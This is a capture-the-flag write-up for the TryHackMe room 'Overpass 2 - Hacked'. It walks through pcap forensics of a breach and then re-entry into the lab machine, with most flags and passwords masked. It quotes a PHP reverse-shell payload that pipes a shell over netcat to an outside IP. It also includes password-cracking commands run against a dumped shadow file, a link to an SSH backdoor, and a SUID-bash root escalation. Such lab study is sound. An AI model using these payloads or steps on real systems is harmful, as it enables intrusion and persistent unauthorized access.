# Overpass 2 - Hacked

![img](https://github.com/edoardottt/tryhackme-ctf/blob/main/Overpass2-Hacked/img.png)

If you are experiencing trouble, google `wireshark follow tcp stream`

- What was the URL of the page they used to upload a reverse shell?

	- Open Wireshark, and then open the pcap file.
	- `/development/`

- What payload did the attacker use to gain access?

	- You have to search a big POST request.
	- `<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>`

- What password did the attacker use to privesc?

	- Packet no. 76
	- `whe***************tant`

- How did the attacker establish persistence?

	- Packet no. 120
	- `https://github.com/NinjaJc01/ssh-backdoor`

- Using the fasttrack wordlist, how many of the system passwords were crackable?

	- Save the content of response 114 on a file called `shadow`
	- `john --wordlist=fasttrack.txt shadow`
	- `*`

- What's the default hash for the backdoor?

	- [ssh-backdoor](https://github.com/NinjaJc01/ssh-backdoor/blob/master/main.go)
	- `******** ... ********`

- What's the hardcoded salt for the backdoor?

	- Same file as above
	- `********************************`

- What was the hash that the attacker used? - go back to the PCAP for this!

	- `*********** ... **************`

- Crack the hash using rockyou and a cracking tool of your choice. What's the password?

	- `hashcat -m 1710 -a 0 HASH_HERE:SALT_HERE /usr/share/wordlists/rockyou.txt`
	- `**********`

- The attacker defaced the website. What message did they leave as a heading?

	- Go to `http://<TARGET_IP>`
	- `H4ck3d by CooctusClan`

- Using the information you've found previously, hack your way back in!

	- `ssh james@<TARGET_IP> -p 2222`
	- Enter the password just cracked.
	- `cd .. && cat user.txt`
	- `thm{********************************}`

- What's the root flag?

	- `cd ~`
	- `ls -alh`
	- `./.suid-bash -p`
	- `cat /root/root.txt`
	- `thm{********************************}`




